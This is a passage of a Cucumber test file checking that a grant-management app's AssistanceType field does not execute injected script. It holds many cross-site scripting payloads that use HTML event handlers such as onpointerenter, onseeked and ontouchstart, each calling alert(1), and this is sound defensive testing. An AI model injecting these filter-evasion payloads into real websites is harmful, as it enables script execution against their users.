    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                  |
      | <xss onpointerenter=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302087 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                  |
      | <xss onpointerleave=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302088 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                  |
      | <xss onpointermove=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302089 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                    | Field                  |
      | <xss onpointerout=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302089 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                    | Field                  |
      | <xss onpointerout=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302090 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                  |
      | <xss onpointerover=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302091 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                          | Field                  |
      | <xss onpointerrawupdate=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302092 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                   | Field                  |
      | <xss onpointerup=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302093 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                 | Field                  |
      | <audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302094 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                     | Field                  |
      | <form onreset=alert(1)><input type=reset> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302095 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                    | Field                  |
      | <form><input type=search onsearch=alert(1) value="Hit return" autofocus> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302096 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                             | Field                  |
      | <audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302099 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                              | Field                  |
      | <audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302104 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                           | Field                  |
      | <input onselect=alert(1) value="XSS" autofocus> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302105 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                             | Field                  |
      | <body onselectionchange=alert(1)>select some text | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302106 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                         | Field                  |
      | <body onselectstart=alert(1)>select some text | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302153 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                      | Field                  |
      | <div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302157 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                       | Field                  |
      | <form onsubmit=alert(1)><input type=submit> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302159 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                      | Field                  |
      | <body ontouchend=alert(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302161 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                       | Field                  |
      | <body ontouchmove=alert(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302162 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                        | Field                  |
      | <body ontouchstart=alert(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302168 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                   | Field                  |
